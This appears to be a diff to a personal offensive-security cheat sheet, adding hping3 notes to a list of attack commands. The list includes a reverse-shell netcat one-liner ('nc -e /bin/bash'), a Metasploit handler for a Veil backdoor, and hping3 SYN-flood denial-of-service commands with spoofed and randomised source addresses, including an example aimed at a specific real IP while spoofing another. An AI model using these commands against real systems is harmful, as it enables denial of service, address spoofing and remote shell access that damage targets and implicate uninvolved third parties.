@@ -93,6 +93,11 @@ Generate
 msfconsole --resource /var/lib/veil/output/handlers/[yourbackdoor]
 7. nc -e /bin/bash [ip] [port]
 8. from binascii import unhexlify >> unhexlify to convert hex to string
+9. Generate wordlists with crunch
+10. hping3 DOS
+	hping3 -S [host] -p ++[initial_port] >>> Port status discovery (open/not)
+	hping3 -S [host] -p [port] -a [disguised_host] --flood
+	hping3 -S [host] -p [port] -a [disguised_host] --flood --rand-source
 
-
+	example: sudo hping3 -S 45.33.32.156 -p 80 -a 173.203.36.104 --flood --rand-source -V >>> -V for verbose
 
